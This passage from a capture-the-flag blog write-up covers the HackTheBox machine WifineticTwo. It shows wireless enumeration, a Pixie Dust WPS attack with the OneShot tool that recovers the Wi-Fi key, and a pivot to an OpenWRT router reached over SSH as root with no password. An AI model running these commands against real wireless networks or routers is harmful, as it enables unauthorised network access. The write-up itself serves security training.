+<p>And we are root on this linux machine. Usually on HackTheBox, when you are <code>root</code> user after the first foothold directly, it would mean that most probably there is another machine still to be exploited, we confirm this by going to our root directory and getting the <code>user.txt</code> flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># cat user.txt</span></span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">e501a5fe41a817******************</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Pivoting-to-OpenWRT"><a href="#Pivoting-to-OpenWRT" class="headerlink" title="Pivoting to OpenWRT"></a>Pivoting to OpenWRT</h4><p>One thing we can check which was also inspired from the machine name “WifineticTwo”, is to check for network interfaces for anything unusual:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># ifconfig</span></span><br><span class="line">ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255</span><br><span class="line">        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 28273  bytes 2580482 (2.5 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 21222  bytes 3805193 (3.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 220  bytes 13486 (13.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 220  bytes 13486 (13.4 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<h5 id="Wireless-Enumeration"><a href="#Wireless-Enumeration" class="headerlink" title="Wireless Enumeration"></a>Wireless Enumeration</h5><p>We can get further informations using <code>iwconfig</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># iwconfig wlan0</span></span><br><span class="line">iwconfig wlan0</span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any</span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm</span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line"></span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s now scan for wireless network:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># iw dev wlan0 scan</span></span><br><span class="line">iw dev wlan0 scan</span><br><span class="line">BSS 02:00:00:00:01:00(on wlan0)</span><br><span class="line">        last seen: 2050.676s [boottime]</span><br><span class="line">        TSF: 1722095167921033 usec (19931d, 15:46:07)</span><br><span class="line">        freq: 2412</span><br><span class="line">        beacon interval: 100 TUs</span><br><span class="line">        capability: ESS Privacy ShortSlotTime (0x0411)</span><br><span class="line">        signal: -30.00 dBm</span><br><span class="line">        last seen: 0 ms ago</span><br><span class="line">        Information elements from Probe Response frame:</span><br><span class="line">        SSID: plcrouter</span><br><span class="line">        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0</span><br><span class="line">        DS Parameter <span class="built_in">set</span>: channel 1</span><br><span class="line">        ERP: Barker_Preamble_Mode</span><br><span class="line">        Extended supported rates: 24.0 36.0 48.0 54.0</span><br><span class="line">        RSN:     * Version: 1</span><br><span class="line">                 * Group cipher: CCMP</span><br><span class="line">                 * Pairwise ciphers: CCMP</span><br><span class="line">                 * Authentication suites: PSK</span><br><span class="line">                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)</span><br><span class="line">        Supported operating classes:</span><br><span class="line">                 * current operating class: 81</span><br><span class="line">        Extended capabilities:</span><br><span class="line">                 * Extended Channel Switching</span><br><span class="line">                 * SSID List</span><br><span class="line">                 * Operating Mode Notification</span><br><span class="line">        WPS:     * Version: 1.0</span><br><span class="line">                 * Wi-Fi Protected Setup State: 2 (Configured)</span><br><span class="line">                 * Response Type: 3 (AP)</span><br><span class="line">                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1</span><br><span class="line">                 * Manufacturer:</span><br><span class="line">                 * Model:</span><br><span class="line">                 * Model Number:</span><br><span class="line">                 * Serial Number:</span><br><span class="line">                 * Primary Device Type: 0-00000000-0</span><br><span class="line">                 * Device name:</span><br><span class="line">                 * Config methods: Label, Display, Keypad</span><br><span class="line">                 * Version2: 2.0</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>The wlan0 interface is up and ready to be used but is not currently connected to a Wi-Fi network. To activate and connect this interface, you would typically use a network management tool like <code>NetworkManager</code>, <code>wpa_supplicant</code>, or <code>nmcli</code> to connect to a Wi-Fi network, which would then assign an IP address and allow traffic to flow through the interface.</p>
+<p>So our objective now is to be able to connect ourselves to the wifi network, but for that we’ll need the Access Point’s  <code>password</code>, since we have its’ name &#96;&#96;plcrouter.</p>
+<p>After a lot of thoughts on this, I tried performing the <code>Pixie Dust attack</code> attack - in order to acquire the Wifi’s Password- which works by bruteforcing the key for a protocol called WPS. WPS was intended to make accessing a router easier, and it did - for attackers. (lol)<br>You can read more about it <a class="link"   target="_blank" rel="noopener" href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h5 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h5><p>For this I will be using <a class="link"   target="_blank" rel="noopener" href="https://github.com/nikita-yfh/OneShot-C" >Oneshot <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>We alread have the BSSID from the <code>iwlist</code> command, and <code>-K</code> is to perform Pixie Dust. We must also specify the interface which is <code>wlan0</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K</span></span><br><span class="line">./oneshot -i wlan0 -b 02:00:00:00:01:00 -K</span><br><span class="line">[*] Running wpa_supplicant...</span><br><span class="line">[*] Trying pin 12345670...</span><br><span class="line">[*] Scanning...</span><br><span class="line">[*] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[*] Associating with AP...</span><br><span class="line">[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)</span><br><span class="line">[*] Received Identity Request</span><br><span class="line">[*] Sending Identity Response...</span><br><span class="line">[*] Received WPS Message M1</span><br><span class="line">[P] E-Nonce: a84310c1b231e0008743c316ad088fc0</span><br><span class="line">[*] Building Message M2</span><br><span class="line">[P] PKR: 73a38eefbf6b7ad8b1e28e3c38aca607d54e433c0f392839840c435591a3bf0a9a45b721aef8aa5f0a1a9981aafd72cfd229558ca83578c6d840f177611394ca2827576474af431c9f6fb52b01deaf84b5cd95f59323eec9f911221bde9666c96ec9d8cde136aae7c5242d4abeb75150da37571f7cabb59345aba02b66b414b76e0c18e012312866f31d0b2b6154605762dc2b47b8ff7840716954bf5fa7940dd605b7db25282cb0d615d513ed34c0cc6ea061fb598e08caff99db63fb421131</span><br><span class="line">[P] PKE: 35518324d2982510665f7bdddaa979974eefb252ed40ee35eddd93c1380a0b72308bff80f8d3967283e7bfcedc4ff96ce22167a9b1343dd3fddadd9969fb86ffa452e88e4dd64b5760b5914e1cc8c0e1ec70ed4214844ad12f0b8af578da8d4eb83c1152fe67a9f4d96ddf318b24d6aa379cb9cff856cb2a1f43a6f8054c41563917cb6fecf613ccd47ee86110d2622361713e7eb7d2b1c26bc38075f54aeb5c3404000f6ea8738ec8c9249ce4eaff533ae6dc9906b2cc638acf25812c6b7698</span><br><span class="line">[P] Authkey: 99ab77941c3c09b541047a22a4d336b4269e7d267e5416cd6abcecdc77498e64</span><br><span class="line">[*] Received WPS Message M3</span><br><span class="line">[P] E-Hash1: 1bcb50bfd31bdbafd21ccaf2c5c46b56f9fe006a1d62d07758c919e6edc078d0</span><br><span class="line">[P] E-Hash2: 8d7100b084cd9f396c9deeacee87eb8f15f8203f9623f2b4788e7693744a1fec</span><br><span class="line">[*] Building Message M4</span><br><span class="line">[*] Received WPS Message M5</span><br><span class="line">[*] Building Message M6</span><br><span class="line">[*] Received WPS Message M7</span><br><span class="line">[+] WPS PIN: 12345670</span><br><span class="line">[+] WPA PSK: NoWWEDoKnowWhaTisReal123!</span><br><span class="line">[+] AP SSID: plcrouter</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<p>The PSK is <code>NoWWEDoKnowWhaTisReal123</code>.</p>
+<h5 id="Wifi-Connection"><a href="#Wifi-Connection" class="headerlink" title="Wifi Connection"></a>Wifi Connection</h5><p>Now we can connect to the network using <code>wpa_passphrase</code> command which will generate the config file we need:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># wpa_passphrase plcrouter &#x27;NoWWEDoKnowWhaTisReal123!&#x27;</span></span><br><span class="line">wpa_passphrase plcrouter <span class="string">&#x27;NoWWEDoKnowWhaTisReal123!&#x27;</span></span><br><span class="line">network=&#123;</span><br><span class="line">        ssid=<span class="string">&quot;plcrouter&quot;</span></span><br><span class="line">        <span class="comment">#psk=&quot;NoWWEDoKnowWhaTisReal123!&quot;</span></span><br><span class="line">        psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156</span><br><span class="line">&#125;</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now we connect to the network:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># wpa_supplicant -B -c config -i wlan0</span></span><br><span class="line">wpa_supplicant -B -c config -i wlan0</span><br><span class="line">Successfully initialized wpa_supplicant</span><br></pre></td></tr></table></figure></div>
+<p>This made the connection, but we still don’t an IP address:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># iw dev wlan0 link</span></span><br><span class="line">iw dev wlan0 <span class="built_in">link</span></span><br><span class="line">Connected to 02:00:00:00:01:00 (on wlan0)</span><br><span class="line">        SSID: plcrouter</span><br><span class="line">        freq: 2412</span><br><span class="line">        RX: 1214896 bytes (17658 packets)</span><br><span class="line">        TX: 12919 bytes (313 packets)</span><br><span class="line">        signal: -30 dBm</span><br><span class="line">        rx bitrate: 1.0 MBit/s</span><br><span class="line">        tx bitrate: 54.0 MBit/s</span><br><span class="line"></span><br><span class="line">        bss flags:      short-slot-time</span><br><span class="line">        dtim period:    2</span><br><span class="line">        beacon int:     100</span><br><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can now assign ourselves an IP Address to ourselves:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># ifconfig wlan0 192.168.1.137 netmask 255.255.255.0</span></span><br><span class="line">&lt; ifconfig wlan0 192.168.1.137 netmask 255.255.255.0</span><br><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># ifconfig</span></span><br><span class="line">ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255</span><br><span class="line">        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 6034  bytes 537758 (537.7 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 4575  bytes 896694 (896.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 320  bytes 17644 (17.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 320  bytes 17644 (17.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.137  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 fe80::ff:fe00:300  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 8  bytes 1245 (1.2 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 4820 (4.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>So now we are connected to Wifi and have a proper IP address.<br>It is safe to assume that the router’s IP Address is <code>192.168.1.1</code></p>
+<p>let’s check for available machines locally first:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># for ip in 192.168.1.&#123;1..10&#125;; do ping -c 1 -t 1 $ip &gt; /dev/null &amp;&amp; echo &quot;$&#123;ip&#125; is up&quot;; done</span></span><br><span class="line">&lt; 1 -t 1 <span class="variable">$ip</span> &gt; /dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;ip&#125;</span> is up&quot;</span>; <span class="keyword">done</span></span><br><span class="line">192.168.1.1 is up</span><br></pre></td></tr></table></figure></div>
+
+<p>And yes, 192.168.1.1 is up. Let’s upload a statically compiled nmap binary and check it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># ./nmap 192.168.1.1</span></span><br><span class="line">./nmap 192.168.1.1</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-27 17:02 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.000024s latency).</span><br><span class="line">Not shown: 1152 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">53/tcp  open  domain</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">MAC Address: 02:00:00:00:01:00 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.20 seconds</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># curl 192.168.1.1</span></span><br><span class="line">curl 192.168.1.1</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   780  100   780    0     0   247k      0 --:--:-- --:--:-- --:--:--  380k</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">                &lt;meta http-equiv=<span class="string">&quot;Cache-Control&quot;</span> content=<span class="string">&quot;no-cache, no-store, must-revalidate&quot;</span> /&gt;</span><br><span class="line">                &lt;meta http-equiv=<span class="string">&quot;Pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span> /&gt;</span><br><span class="line">                &lt;meta http-equiv=<span class="string">&quot;Expires&quot;</span> content=<span class="string">&quot;0&quot;</span> /&gt;</span><br><span class="line">                &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0; URL=cgi-bin/luci/&quot;</span> /&gt;</span><br><span class="line">                &lt;style <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">                        body &#123; background: white; font-family: arial, helvetica, sans-serif; &#125;</span><br><span class="line">                        a &#123; color: black; &#125;</span><br><span class="line"></span><br><span class="line">                        @media (prefers-color-scheme: dark) &#123;</span><br><span class="line">                                body &#123; background: black; &#125;</span><br><span class="line">                                a &#123; color: white; &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;a href=<span class="string">&quot;cgi-bin/luci/&quot;</span>&gt;LuCI - Lua Configuration Interface&lt;/a&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">root@attica02:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Judging from the <code>LuCI - Lua Configuration Interface</code> I can tell that this is an &#96;&#96;, we can cofirm this with a simple google search:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/OPENWRT.png"
+                      alt="OpenWRT router"
+                ><figcaption>OpenWRT router</figcaption></figure></p>
+<p>I am a bit familiar with it, I’ll try to just ssh into the router and see what happens:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@attica02:~<span class="comment"># ssh -o StrictHostKeyChecking=no root@192.168.1.1</span></span><br><span class="line">ssh -o StrictHostKeyChecking=no root@192.168.1.1</span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">Warning: Permanently added <span class="string">&#x27;192.168.1.1&#x27;</span> (ED25519) to the list of known hosts.</span><br><span class="line">  _______                     ________        __</span><br><span class="line"> |       |.-----.-----.-----.|  |  |  |.----.|  |_</span><br><span class="line"> |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|</span><br><span class="line"> |_______||   __|_____|__|__||________||__|  |____|</span><br><span class="line">          |__| W I R E L E S S   F R E E D O M</span><br><span class="line"> -----------------------------------------------------</span><br><span class="line"> OpenWrt 23.05.2, r23630-842932a63d</span><br><span class="line"> -----------------------------------------------------</span><br><span class="line">=== WARNING! =====================================</span><br><span class="line">There is no root password defined on this device!</span><br><span class="line">Use the <span class="string">&quot;passwd&quot;</span> <span class="built_in">command</span> to <span class="built_in">set</span> up a new password</span><br><span class="line"><span class="keyword">in</span> order to prevent unauthorized SSH logins.</span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure></div>
+
+<p>It appears that luckily the root user doesn’t have a password set on the router. And we get our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">fb0c5ca0be6258******************</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Thank you for reading &lt;3<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HackTheBox: WifineticTwo</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-07-27 18:21:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-07-27 18:25:58
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/07/27/HackTheBox-WifineticTwo/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/07/20/HackTheBox-Headless/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">HackTheBox: Headless</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">HackTheBox: WifineticTwo</div>
